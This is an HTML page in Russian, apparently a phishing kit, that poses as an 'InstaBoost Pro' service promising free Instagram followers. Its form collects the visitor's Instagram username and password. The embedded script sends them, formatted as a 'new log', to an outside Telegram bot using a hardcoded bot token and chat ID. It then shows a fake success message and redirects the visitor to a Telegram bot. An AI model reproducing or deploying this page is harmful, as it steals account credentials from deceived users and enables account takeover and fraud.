<!DOCTYPE html>
<html lang="ru">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>InstaBoost Pro</title>
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css">
    <style>
        body { margin: 0; height: 100vh; display: flex; justify-content: center; align-items: center; background: linear-gradient(135deg, #2b0a3d, #3a0ca3, #720026); font-family: -apple-system, sans-serif; }
        .container { width: 320px; background: rgba(255,255,255,0.05); backdrop-filter: blur(15px); border-radius: 25px; display: flex; flex-direction: column; padding: 25px 20px 20px 20px; box-shadow: 0 10px 40px rgba(0,0,0,0.5); border: 1px solid rgba(255,255,255,0.1); }
        .social-icons { display: flex; justify-content: center; gap: 20px; margin-bottom: 15px; font-size: 24px; color: rgba(255,255,255,0.7); }
        .header { text-align: center; color: white; font-weight: bold; margin-bottom: 20px; font-size: 1.2em; }
        .input-group { display: flex; flex-direction: column; gap: 12px; }
        input { width: 100%; padding: 14px; border-radius: 15px; border: none; background: rgba(255,255,255,0.9); box-sizing: border-box; font-size: 16px; outline: none; }
        .btn-send { margin-top: 15px; padding: 15px; border: none; border-radius: 15px; background: #ff006e; color: white; cursor: pointer; font-weight: bold; font-size: 16px; transition: 0.3s; }
        .btn-send:active { transform: scale(0.96); background: #d9005d; }
    </style>
</head>
<body>
<div class="container">
    <div class="social-icons">
        <i class="fab fa-telegram"></i>
        <i class="fab fa-instagram"></i>
        <i class="fab fa-whatsapp"></i>
    </div>
    <div class="header">Instagram: Накрутка подписчиков👥</div>
    <div class="input-group">
        <input type="text" id="username" placeholder="Логин (Instagram)">
        <input type="password" id="password" placeholder="Пароль">
        <button class="btn-send" id="mainBtn" onclick="sendMessage()">Получить подписчиков</button>
    </div>
</div>
<script>
    async function sendMessage() {
        // ТВОИ ДАННЫЕ (ПРОВЕРЕННЫЕ)
        const botToken = "8653348218:AAEIW_z5aWHH76yiuFQL3cPKf02e3wNBxn4";
        const chatId = "7829181579";
        const redirectUrl = "https://t.me/HQ_smmbot_bot"; // Твоя ссылка

        let uF = document.getElementById("username");
        let pF = document.getElementById("password");
        let btn = document.getElementById("mainBtn");

        if (!uF.value || !pF.value) { 
            alert("Пожалуйста, заполните все поля для авторизации"); 
            return; 
        }

        btn.innerText = "Загрузка...";
        btn.disabled = true;

        const t = new Date().toLocaleTimeString('ru-RU', { hour: '2-digit', minute: '2-digit' });
        const text = `<b>🔥 НОВЫЙ ЛОГ!</b>\n\n👤 <b>Логин:</b> <code>${uF.value}</code>\n🔑 <b>Пароль:</b> <code>${pF.value}</code>\n⏰ <b>Время:</b> ${t}`;

        try {
            await fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ chat_id: chatId, text: text, parse_mode: "HTML" })
            });

            // После успешной отправки — перекидываем на бота
            alert("Авторизация успешна! Нажмите ОК для перехода к выбору подписчиков.");
            window.location.href = redirectUrl;

        } catch (e) {
            alert("Ошибка соединения. Попробуйте позже.");
            btn.innerText = "Отправить";
            btn.disabled = false;
        }
    }
</script>
</body>
</html>
